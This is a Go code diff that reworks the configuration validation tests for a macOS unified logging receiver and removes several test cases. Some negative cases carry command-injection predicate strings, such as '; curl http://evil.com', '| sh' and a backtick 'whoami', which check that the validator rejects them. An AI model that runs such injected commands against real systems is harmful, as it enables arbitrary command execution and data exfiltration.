@@ -6,6 +6,7 @@
 package macosunifiedloggingreceiver
 
 import (
+	"errors"
 	"os"
 	"path/filepath"
 	"testing"
@@ -18,201 +19,108 @@ import (
 func TestConfigValidate(t *testing.T) {
 	testCases := []struct {
 		desc        string
-		makeCfg     func(t *testing.T) *Config
-		expectedErr string
+		cfg         *Config
+		expectedErr error
 	}{
 		{
 			desc: "valid config - live mode",
-			makeCfg: func(_ *testing.T) *Config {
-				return &Config{
-					MaxPollInterval: 50 * time.Second,
-					MaxLogAge:       12 * time.Hour,
-				}
+			cfg: &Config{
+				MaxPollInterval: 50 * time.Second,
+				MaxLogAge:       12 * time.Hour,
 			},
+			expectedErr: nil,
 		},
 		{
 			desc: "invalid archive path - does not exist",
-			makeCfg: func(t *testing.T) *Config {
-				return &Config{
-					ArchivePath: filepath.Join(t.TempDir(), "missing", "logs.logarchive"),
-				}
+			cfg: &Config{
+				ArchivePath: "/tmp/test/invalid",
 			},
-			expectedErr: "no such file or directory",
+			expectedErr: errors.New("no such file or directory"),
 		},
 		{
 			desc: "invalid archive path - not a directory",
-			makeCfg: func(_ *testing.T) *Config {
-				return &Config{
-					ArchivePath: "./README.md",
-				}
+			cfg: &Config{
+				ArchivePath: "./README.md",
 			},
-			expectedErr: "must be a directory",
-		},
-		{
-			desc: "archive glob requires at least one match",
-			makeCfg: func(t *testing.T) *Config {
-				return &Config{
-					ArchivePath: filepath.Join(t.TempDir(), "*.logarchive"),
-				}
-			},
-			expectedErr: "no archive paths matched the provided pattern",
-		},
-		{
-			desc: "end time requires archive path",
-			makeCfg: func(_ *testing.T) *Config {
-				return &Config{
-					EndTime: "2024-01-02 00:00:00",
-				}
-			},
-			expectedErr: "end_time can only be used with archive_path",
+			expectedErr: errors.New("must be a directory"),
 		},
 		{
 			desc: "valid predicate with AND",
-			makeCfg: func(_ *testing.T) *Config {
-				return &Config{
-					Predicate: "subsystem == 'com.apple.example' AND messageType == 'Error'",
-				}
+			cfg: &Config{
+				Predicate: "subsystem == 'com.apple.example' AND messageType == 'Error'",
 			},
+			expectedErr: nil,
 		},
 		{
 			desc: "valid predicate with && (normalized to AND)",
-			makeCfg: func(_ *testing.T) *Config {
-				return &Config{
-					Predicate: "subsystem == 'com.apple.example' && messageType == 'Error'",
-				}
+			cfg: &Config{
+				Predicate: "subsystem == 'com.apple.example' && messageType == 'Error'",
 			},
+			expectedErr: nil,
 		},
 		{
 			desc: "valid predicate with || (normalized to OR)",
-			makeCfg: func(_ *testing.T) *Config {
-				return &Config{
-					Predicate: "subsystem == 'com.apple.example' || messageType == 'Error'",
-				}
+			cfg: &Config{
+				Predicate: "subsystem == 'com.apple.example' || messageType == 'Error'",
 			},
+			expectedErr: nil,
 		},
 		{
 			desc: "valid predicate with comparison operators",
-			makeCfg: func(_ *testing.T) *Config {
-				return &Config{
-					Predicate: "processID > 100 && processID < 1000",
-				}
+			cfg: &Config{
+				Predicate: "processID > 100 && processID < 1000",
 			},
+			expectedErr: nil,
 		},
 		{
 			desc: "valid predicate with > comparison and spaces",
-			makeCfg: func(_ *testing.T) *Config {
-				return &Config{
-					Predicate: "processID >100",
-				}
+			cfg: &Config{
+				Predicate: "processID >100",
 			},
+			expectedErr: nil,
 		},
 		{
 			desc: "invalid predicate - semicolon",
-			makeCfg: func(_ *testing.T) *Config {
-				return &Config{
-					Predicate: "subsystem == 'test'; curl http://evil.com",
-				}
+			cfg: &Config{
+				Predicate: "subsystem == 'test'; curl http://evil.com",
 			},
-			expectedErr: "predicate contains invalid character",
+			expectedErr: errors.New("predicate contains invalid character"),
 		},
 		{
 			desc: "invalid predicate - pipe",
-			makeCfg: func(_ *testing.T) *Config {
-				return &Config{
-					Predicate: "subsystem == 'test' | sh",
-				}
+			cfg: &Config{
+				Predicate: "subsystem == 'test' | sh",
 			},
-			expectedErr: "predicate contains invalid character",
+			expectedErr: errors.New("predicate contains invalid character"),
 		},
 		{
 			desc: "invalid predicate - dollar sign",
-			makeCfg: func(_ *testing.T) *Config {
-				return &Config{
-					Predicate: "subsystem == '$HOME'",
-				}
+			cfg: &Config{
+				Predicate: "subsystem == '$HOME'",
 			},
-			expectedErr: "predicate contains invalid character",
+			expectedErr: errors.New("predicate contains invalid character"),
 		},
 		{
 			desc: "invalid predicate - backtick",
-			makeCfg: func(_ *testing.T) *Config {
-				return &Config{
-					Predicate: "subsystem == '`whoami`'",
-				}
+			cfg: &Config{
+				Predicate: "subsystem == '`whoami`'",
 			},
-			expectedErr: "predicate contains invalid character",
+			expectedErr: errors.New("predicate contains invalid character"),
 		},
 		{
 			desc: "invalid predicate - append redirect",
-			makeCfg: func(_ *testing.T) *Config {
-				return &Config{
-					Predicate: "subsystem == 'test' >> /tmp/output",
-				}
+			cfg: &Config{
+				Predicate: "subsystem == 'test' >> /tmp/output",
 			},
-			expectedErr: "predicate contains invalid character",
-		},
-		{
-			desc: "predicate must contain valid field name",
-			makeCfg: func(_ *testing.T) *Config {
-				return &Config{
-					Predicate: "unknownField == 'value'",
-				}
-			},
-			expectedErr: "predicate must contain at least one valid field name",
-		},
-		{
-			desc: "predicate must contain operator",
-			makeCfg: func(_ *testing.T) *Config {
-				return &Config{
-					Predicate: "subsystem 'com.apple'",
-				}
-			},
-			expectedErr: "predicate must contain at least one valid operator",
-		},
-		{
-			desc: "predicate must contain valid event type when type is referenced",
-			makeCfg: func(_ *testing.T) *Config {
-				return &Config{
-					Predicate: "type == 'invalidEvent'",
-				}
-			},
-			expectedErr: "predicate must contain at least one valid event type",
-		},
-		{
-			desc: "predicate must contain valid log type when logType is referenced",
-			makeCfg: func(_ *testing.T) *Config {
-				return &Config{
-					Predicate: "logType == 'invalid'",
-				}
-			},
-			expectedErr: "predicate must contain at least one valid log type",
-		},
-		{
-			desc: "predicate must contain valid signpost scope when signpostScope is referenced",
-			makeCfg: func(_ *testing.T) *Config {
-				return &Config{
-					Predicate: "signpostScope == 'invalid'",
-				}
-			},
-			expectedErr: "predicate must contain at least one valid signpost scope",
-		},
-		{
-			desc: "predicate must contain valid signpost type when signpostType is referenced",
-			makeCfg: func(_ *testing.T) *Config {
-				return &Config{
-					Predicate: "signpostType == 'invalid'",
-				}
-			},
-			expectedErr: "predicate must contain at least one valid signpost type",
+			expectedErr: errors.New("predicate contains invalid character"),
 		},
 	}
 
 	for _, tc := range testCases {
 		t.Run(tc.desc, func(t *testing.T) {
-			cfg := tc.makeCfg(t)
-			err := cfg.Validate()
-			if tc.expectedErr != "" {
-				require.ErrorContains(t, err, tc.expectedErr)
+			err := tc.cfg.Validate()
+			if tc.expectedErr != nil {
+				require.ErrorContains(t, err, tc.expectedErr.Error())
 			} else {
 				require.NoError(t, err)
 			}
